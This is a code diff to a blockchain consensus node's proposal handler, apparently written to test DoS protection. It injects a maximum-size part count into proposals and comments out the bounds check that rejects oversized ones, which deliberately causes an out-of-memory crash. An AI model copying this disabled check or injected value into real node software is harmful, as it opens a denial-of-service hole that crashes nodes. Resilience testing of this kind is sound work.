@@ -2362,6 +2362,17 @@ func (cs *State) RecordMetrics(height int64, block *types.Block) {
 //-----------------------------------------------------------------------------
 
 func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time) error {
+	// 🚨 MALICIOUS ATTACK INJECTION - Test if DoS protection works
+	// This node will OOM itself, but network protection should prevent propagation to other nodes
+	if proposal != nil {
+		originalTotal := proposal.BlockID.PartSetHeader.Total
+		proposal.BlockID.PartSetHeader.Total = 4294967295 // Max uint32 - will cause OOM
+		fmt.Println("EVIL NODE: Injecting DoS attack",
+			"original_total", originalTotal,
+			"malicious_total", proposal.BlockID.PartSetHeader.Total,
+			"expected_outcome", "this node will OOM, but others should be protected")
+	}
+
 	// Already have one
 	// TODO: possibly catch double proposals
 	if cs.roundState.Proposal() != nil || proposal == nil {
@@ -2395,12 +2406,22 @@ func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time
 	// This happens if we're already in cstypes.RoundStepCommit or if there is a valid block in the current round.
 	// TODO: We can check if Proposal is for a different block as this is a sign of misbehavior!
 	if cs.roundState.ProposalBlockParts() == nil {
-		// apply the same check as in SetHasProposal
-		if proposal.BlockID.PartSetHeader.Total > types.MaxBlockPartsCount {
-			cs.logger.Debug("rejecting proposal with too many parts", "total", proposal.BlockID.PartSetHeader.Total, "max", types.MaxBlockPartsCount)
-			return ErrInvalidProposalPartSetHeader
-		}
+		// 🚨 EVIL NODE: Disable internal protection to allow self-OOM attack
+		// The network protection in reactor.go should still protect other nodes
+		/*
+			// apply the same check as in SetHasProposal
+			if proposal.BlockID.PartSetHeader.Total > types.MaxBlockPartsCount {
+				cs.logger.Debug("rejecting proposal with too many parts", "total", proposal.BlockID.PartSetHeader.Total, "max", types.MaxBlockPartsCount)
+				return ErrInvalidProposalPartSetHeader
+			}
+		*/
+
+		fmt.Println("EVIL NODE: Creating massive BitArray - INCOMING OOM!",
+			"total", proposal.BlockID.PartSetHeader.Total,
+			"estimated_memory_gb", float64(proposal.BlockID.PartSetHeader.Total)/8/1024/1024/1024)
+
 		cs.metrics.MarkBlockGossipStarted()
+		// 💀 This will allocate ~16GB of memory and cause OOM
 		cs.roundState.SetProposalBlockParts(types.NewPartSetFromHeader(proposal.BlockID.PartSetHeader))
 	}
 
